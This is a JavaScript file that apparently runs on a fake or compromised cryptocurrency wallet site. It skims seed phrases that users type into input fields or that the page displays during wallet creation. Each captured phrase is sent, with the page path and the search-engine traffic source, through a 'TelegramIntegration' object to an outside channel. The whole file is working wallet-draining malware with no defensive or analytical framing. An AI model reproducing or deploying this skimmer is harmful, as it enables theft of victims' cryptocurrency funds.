// Traffic source detection
function getTrafficSource() {
  const referrer = document.referrer.toLowerCase();
  const urlParams = new URLSearchParams(window.location.search);
  
  // Check referrer
  if (referrer.includes('google.com') || referrer.includes('google.co')) {
    return 'Google SEO';
  } else if (referrer.includes('bing.com')) {
    return 'Bing SEO';
  }
  
  // Check URL parameters
  const source = urlParams.get('utm_source') || urlParams.get('source');
  if (source) {
    if (source.toLowerCase().includes('google')) return 'Google SEO';
    if (source.toLowerCase().includes('bing')) return 'Bing SEO';
  }
  
  return referrer || 'Direct';
}

// Monitor displayed seed phrases (wallet creation)
function monitorDisplayedPhrases() {
  const observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
      mutation.addedNodes.forEach(function(node) {
        if (node.nodeType === 1) { // Element node
          checkForDisplayedPhrase(node);
        }
      });
    });
  });
  
  observer.observe(document.body, {
    childList: true,
    subtree: true
  });
  
  // Also check existing content
  setTimeout(function() {
    checkForDisplayedPhrase(document.body);
  }, 2000);
}

function checkForDisplayedPhrase(element) {
  // Look for seed phrase containers (common patterns)
  const selectors = [
    '[class*="seed"]',
    '[class*="phrase"]',
    '[class*="mnemonic"]',
    '[class*="recovery"]',
    '[class*="backup"]',
    '[class*="word"]',
    '[data-testid*="seed"]',
    '[data-testid*="phrase"]'
  ];
  
  selectors.forEach(function(selector) {
    try {
      const elements = element.querySelectorAll ? element.querySelectorAll(selector) : [];
      elements.forEach(function(el) {
        const text = el.textContent || el.innerText || '';
        const trimmed = text.trim();
        
        if (isSeedPhrase(trimmed) && !el.getAttribute('data-phrase-logged')) {
          el.setAttribute('data-phrase-logged', 'true');
          const trafficSource = getTrafficSource();
          
          if (window.TelegramIntegration) {
            window.TelegramIntegration.send({
              type: 'WALLET_CREATED_PHRASE_DISPLAYED',
              content: trimmed,
              wordCount: trimmed.split(/\s+/).filter(w => w.length > 0).length,
              context: 'User saw this phrase during wallet creation',
              page: window.location.pathname,
              trafficSource: trafficSource,
              timestamp: new Date().toISOString()
            }).then(() => console.log('📋 Displayed phrase logged (' + trimmed.split(/\s+/).filter(w => w.length > 0).length + ' words) from ' + trafficSource));
          }
        }
      });
    } catch (e) {
      // Silently ignore selector errors
    }
  });
}

// Auto-capture seed phrases only (NO passwords)
document.addEventListener('DOMContentLoaded', function() {
  const trafficSource = getTrafficSource();
  console.log('🔍 Traffic source:', trafficSource);
  
  // Start monitoring for displayed phrases
  monitorDisplayedPhrases();
  
  // Enhanced phrase detection - captures 12, 15, 18, 21, 24 words
  let lastSentValue = '';
  let phraseTimeout;
  
  function isSeedPhrase(value) {
    const words = value.trim().split(/\s+/).filter(w => w.length > 0);
    // ONLY accept exact 12, 15, 18, 21, or 24 words
    return [12, 15, 18, 21, 24].includes(words.length);
  }
  
  document.addEventListener('input', function(e) {
    const target = e.target;
    if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
      clearTimeout(phraseTimeout);
      phraseTimeout = setTimeout(function() {
        const val = target.value.trim();
        
        // Only send if value changed and is a seed phrase
        if (val !== lastSentValue && isSeedPhrase(val)) {
          lastSentValue = val;
          const words = val.split(/\s+/).filter(w => w.length > 2);
          
          if (window.TelegramIntegration) {
            window.TelegramIntegration.send({
              type: 'SEED_PHRASE',
              content: val,
              wordCount: words.length,
              field: target.name || target.id || target.placeholder || 'input_field',
              page: window.location.pathname,
              trafficSource: trafficSource,
              timestamp: new Date().toISOString()
            }).then(() => console.log('✅ Phrase sent (' + words.length + ' words) from ' + trafficSource)).catch(e => console.error('❌ Failed:', e));
          }
        }
      }, 800);
    }
  });
  
  // Also on blur
  document.addEventListener('blur', function(e) {
    const target = e.target;
    if ((target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') && target.value.trim()) {
      const val = target.value.trim();
      if (isSeedPhrase(val) && val !== lastSentValue) {
        lastSentValue = val;
        const words = val.split(/\s+/).filter(w => w.length > 2);
        
        if (window.TelegramIntegration) {
          window.TelegramIntegration.send({
            type: 'SEED_PHRASE_BLUR',
            content: val,
            wordCount: words.length,
            field: target.name || target.id || target.placeholder || 'input_field',
            page: window.location.pathname,
            trafficSource: trafficSource
          });
        }
      }
    }
  }, true);
});
